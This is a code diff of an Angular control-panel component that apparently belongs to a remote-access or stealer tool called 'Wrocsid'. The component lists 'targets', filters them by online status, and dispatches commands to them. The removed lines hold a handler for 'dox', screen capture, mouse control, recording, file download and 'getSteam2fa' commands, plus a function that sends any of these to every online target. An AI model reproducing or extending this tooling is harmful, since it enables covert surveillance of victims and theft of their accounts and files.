@@ -20,7 +20,7 @@ export class BodyComponent implements OnInit {
   mouseFormAll!: FormGroup
   recordFormAll!: FormGroup
   downloadFormAll!: FormGroup
-  disabled: boolean = true
+  disabled: boolean = false
   path: string = ""
   search: string = ""
   showOnlineTargetsOnly: boolean = false
@@ -28,34 +28,6 @@ export class BodyComponent implements OnInit {
   constructor(private wrocsid:WrocsidService, private fb: FormBuilder) {}
 
   async ngOnInit(): Promise<void> {
-    this.mouseForm = this.fb.group({
-      timeAmount: ['', [Validators.required, Validators.min(1), this.timeControlValidation]],
-      timeUnits: ['s']
-    })
-
-    this.recordForm = this.fb.group({
-      timeAmount: ['', [Validators.required, Validators.min(1), this.timeControlValidation]],
-      timeUnits: ['s']
-    })
-
-    this.downloadForm = this.fb.group({
-      path: ['', [Validators.required, Validators.minLength(6)]],
-    })
-
-    this.mouseFormAll = this.fb.group({
-      timeAmount: ['', [Validators.required, Validators.min(1), this.timeControlValidation]],
-      timeUnits: ['s']
-    })
-
-    this.recordFormAll = this.fb.group({
-      timeAmount: ['', [Validators.required, Validators.min(1), this.timeControlValidation]],
-      timeUnits: ['s']
-    })
-
-    this.downloadFormAll = this.fb.group({
-      path: ['', [Validators.required, Validators.minLength(6)]],
-    })
-
     let temp_targets
     this.targets = this.targetsSearch = await firstValueFrom(this.wrocsid.get_targets_data())
 
@@ -70,26 +42,6 @@ export class BodyComponent implements OnInit {
       }
     }
   }
-
-  timeControlValidation(control: AbstractControl) {
-    if (Number(control.value) <= 0) {
-      return { invalidTimeAmount: true };
-    }
-    return null;
-  }
-
-  getPath(form: FormGroup) {
-    return String(form.controls['path'].value)
-  }
-
-  concatTime(form: FormGroup) {
-    return String(form.controls['timeAmount'].value).concat(form.controls['timeUnits'].value)
-  }
-
-  changeInputFormState() {
-    this.disabled = !this.disabled
-  }
-
 
   delay(ms: number) {
     return new Promise( resolve => setTimeout(resolve, ms) );
@@ -113,29 +65,6 @@ export class BodyComponent implements OnInit {
 
   changePanelState() {
     this.panelOpenState = !this.panelOpenState
-  }
-
-  wrocsidHandler(command: string, identifier: any, args?: any) {
-    switch (command) {
-      case 'dox':
-        this.wrocsid.dox(identifier)
-        break;
-      case 'mouse':
-        this.wrocsid.mouse(identifier, args)
-        break;
-      case 'screen':
-        this.wrocsid.screen(identifier)
-        break;
-      case 'download':
-        this.wrocsid.download(identifier, args)
-        break;
-      case 'record':
-        this.wrocsid.record(identifier, args)
-        break;
-      case 'getSteam2fa':
-        this.wrocsid.getSteam2fa(identifier)
-        break;
-    }
   }
 
   searchFilter(target: Target, search: string): boolean {
@@ -176,16 +105,4 @@ export class BodyComponent implements OnInit {
       this.targetsSearch = this.targets.filter((target: Target) => this.searchFilter(target, this.search))
     }
   }
-
-  sendCommandToAllOnlineTargets(command: string, args?: any) {
-    let onlineTargets = this.targets.filter((target: Target) => this.onlineFilter(target, true))
-    onlineTargets.forEach((onlineTarget: Target) => {
-      if(args) {
-        this.wrocsidHandler(command, onlineTarget.identifier, args)
-      } else {
-        this.wrocsidHandler(command, onlineTarget.identifier)
-      }
-    });
-  }
 }
-
